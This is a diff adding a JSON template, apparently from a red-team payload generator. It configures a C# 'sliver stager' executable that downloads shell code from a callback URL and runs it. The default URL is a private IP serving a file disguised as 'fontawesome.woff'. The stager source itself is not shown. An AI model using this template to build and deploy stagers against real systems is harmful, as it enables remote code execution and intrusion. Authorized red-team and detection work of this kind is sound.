@@ -1,0 +1,39 @@
+{
+    "categories": [
+        "exe",
+        "sliver"
+    ],
+    "description": "Executable that downloads and runs shell code. This is the example sliver stager.",
+    "contentFile": "exesliverstager.txt",
+    "customAttributes": [
+        {
+            "name": "callbackURL",
+            "description": "URL from which the shell code will be downloaded.",
+            "defaultValue": "http://192.168.43.130:2424/fontawesome.woff"
+        },
+        {
+            "name": "compile",
+            "description": "Whether or not to compile. Y/N",
+            "defaultValue": "Y"
+        }
+    ],
+    "shellCode": {
+        "hasShellCode": false
+    },
+    "compilation": {
+        "compilationType": "csharp",
+        "target": "exe",
+        "compilationAttributes": [
+            {
+                "name": "architecture",
+                "description": "The architecture, x64 or x86.",
+                "defaultValue": "x64"
+            },
+            {
+                "name": "saveAs",
+                "description": "Name of file to be created, can be full path or just a name",
+                "defaultValue": "stager.exe"
+            }
+        ]
+    }
+}
